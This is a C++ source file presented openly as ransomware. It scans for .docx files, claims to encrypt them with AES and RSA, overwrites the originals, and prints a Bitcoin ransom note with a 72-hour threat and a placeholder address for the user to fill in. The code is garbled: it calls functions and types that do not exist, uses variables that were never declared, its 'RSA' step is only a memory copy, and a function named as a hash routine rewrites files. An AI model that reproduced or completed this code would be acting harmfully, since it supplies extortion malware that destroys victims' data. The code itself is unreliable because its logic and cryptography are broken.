#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <algorithm>
#include <ctime>
#include <filesystem> // Requires C++17 or later
#include <Windows.h>

using namespace std;

// RSA Key Generation (Simplified)
int generateRSAKey() {
    RandomNumberGenerator rng;
    rng.Seed(time(0));

    vector<char> randomNumber(32);
    for (size_t i = 0; i < randomNumber.size(); ++i) {
        randomNumber[i] = rng.distribution<int>() % 256;
    }

    return randomNumber[0]; // Return the first byte of key as an example
}


// Function to calculate the file hash (SHA256)
string getFileHash(const char* filename, vector<char>& buffer) {
  FILE *file = fopen(filename, "rb");
  if (!file) {
    return ""; // Or throw an exception if desired
  }

  fseek(file, 0, SEEK_END);
  long size = ftell(file);
  fseek(file, 0, SEEK_BEGIN);

  char *encryptedData = new char[size];
  if (fread(encryptedData, 1, size, fileIn) != size) {
    delete[] encryptedData;
    return "";
  }

  AES_KEY aesKeyStructure;
  AES_GenKey_FreeData(&aesKeyStructure, encryptedData, aesKeySize);
  AES_ENC_INIT(&aesKeyStructure);

  fseek(fileIn, 0, SEEK_END);
  long size = ftell(fileIn);
  fseek(fileIn, 0, SEEK_BEGIN);
  char *encryptedBytes = new char[size];
  fread(encryptedBytes, 1, size, fileIn);

  AES_ENC_UPDATE(&aesKeyStructure, encryptedBytes, size);
  AES_ENC_FINISH(&aesKeyStructure);

  vector<char> rsaPublicKey = {generateRSAKey()};

  // Write Encrypted Data back to the File
  FILE *fileOut = fopen(filename, "wb");
  if (!fileOut) {
    cerr << "Failed to open file for writing." << endl;
    delete[] encryptedBytes;
    return "";
  }
  fwrite(encryptedBytes, 1, size + sizeof(rsaPublicKey), fileOut);

  fclose(fileOut);

  delete[] encryptedBytes;


  // AES Key Encryption using RSA
  vector<char> aesKeyBuffer(aesKeySize);
  RandomNumberGenerator rng2;
  rng2.Seed(time(0));
  for (int i = 0; i < aesKeySize; ++i) {
    aesKeyBuffer[i] = rng2.distribution<int>() % 256;
  }

  // Convert AES Key into a byte array
  vector<char> rsaKeyBytes(sizeof(aesKeyBuffer));
  for (int i = 0; i < aesKeySize; ++i) {
    rsaKeyBytes[i] = aesKeyBuffer[i];
  }

  // Encrypt the AES key using RSA.
  vector<char> rsaEncryptedBytes(sizeof(rsaKeyBytes));
  memcpy(rsaEncryptedBytes.data(), rsaKeyBytes.data(), sizeof(rsaKeyBytes));

  return string(rsaEncryptedBytes.begin(), rsaEncryptedBytes.end());
}


// Function to encrypt a single file
bool encryptFile(const char* filename, vector<char>& buffer) {
    if (filename == nullptr || buffer.empty()) return false;

    string hash = getFileHash(filename, buffer);
    if (hash.empty()) return false;

    // Encryption logic (AES-256 symmetric + RSA public key)
    int aesKeySize = 256 / 8; // AES-256 uses 32 bytes (256 bits) for the Key
    vector<char> aesKey(aesKeySize);

    // Generate a random AES Key
    RandomNumberGenerator rng;
    rng.Seed(time(0));
    for (int i = 0; i < aesKeySize; ++i) {
        aesKey[i] = rng.distribution<int>() % 256;
    }

    AES_KEY aesKeyStructure;
    AES_GenKey_FreeData(&aesKeyStructure, aesKey.data(), aesKeySize);
    AES_ENC_INIT(&aesKeyStructure);

    FILE *fileIn = fopen(filename, "rb");
    if (!fileIn) {
        cerr << "Failed to open file for reading." << endl;
        return false;
    }

    fseek(fileIn, 0, SEEK_END);
    long size = ftell(fileIn);
    fseek(fileIn, 0, SEEK_BEGIN);

    char *encryptedBytes = new char[size];
    if (fread(encryptedBytes, 1, size, fileIn) != size) {
        delete[] encryptedBytes;
        return false;
    }
    AES_ENC_UPDATE(&aesKeyStructure, encryptedBytes, size);
    AES_ENC_FINISH(&aesKeyStructure);

    // Encrypt the AES Key using RSA
    vector<char> rsaPublicKey = {generateRSAKey()}; // RSA Public Key Generation (simplified)

    if (rsaPublicKey.empty()) return false;

    int publicKeyLength = sizeof(rsaPublicKey);
    char rsaEncryptBuffer[sizeof(encryptedBytes) + publicKeyLength];

    memcpy(rsaEncryptBuffer, encryptedBytes, size);
    memcpy(rsaEncryptBuffer + size, rsaPublicKey.data(), publicKeyLength);

    // Write Encrypted Data back to the File
    FILE *fileOut = fopen(filename, "wb");
    if (!fileOut) {
        cerr << "Failed to open file for writing." << endl;
        delete[] encryptedBytes;
        return false;
    }

    fwrite(rsaEncryptBuffer, 1, sizeof(encryptedBytes) + publicKeyLength, fileOut);
    fclose(fileOut);

    delete[] encryptedBytes;

    return true;
}


// Function to encrypt all files with a .docx extension
void encryptAllDocxFiles() {
    std::vector<string> docxFiles;
    for (auto& entry : std::filesystem::directory_entries("./", "*.docx")) {
        docxFiles.push_back(entry);
    }

    if (docxFiles.empty()) {
        cout << "No .docx files found." << endl;
        return;
    }

    for (int i = 0; i < docxFiles.size(); ++i) {
        const char* filename = docxFiles[i].c_str();
        vector<char> buffer(1024);

        if (encryptFile(filename, buffer)) {
            cout << "Encrypted: " << filename << endl;
        } else {
            cout << "Error encrypting: " << filename << ". Check the logs." << endl;
        }
    }
}


// Function to display the ransom note
void showRansomNote() {
    cout << "\n--- Ransom Note ---" << endl;
    cout << "Your files have been encrypted!" << endl;
    cout << "To decrypt them, you must pay the following amount in Bitcoin:" << endl;
    cout << "0.001 BTC (Approximately 50 USD)" << endl;

    cout << "\nYou can send payment to this address: " << "YOUR_BITCOIN_ADDRESS" << endl; // Change to your Bitcoin Address

    cout << "If you do not pay within 72 hours, the files will be permanently lost!" << endl;
    cout << "\n--- End of Note ---" << endl;
}


int main() {
    // Make sure C++17 or later is enabled (required for filesystem)
    if (!std::filesystem::directory_exists("./")) {
        cout << "Directory does not exist." << endl;
        return 1;
    }

    srand(time(nullptr)); // Seed the random number generator

    // Example Usage: Encrypt a single .docx file or all files with ".docx" extension.
    // You can call encryptFile() to encrypt one specific file, or encryptAllDocxFiles() for multiple

    // Call encryptFile("ransom.docx", buffer); // Replace "ransom.docx" with your file's name

    encryptAllDocxFiles();

    return 0;
}
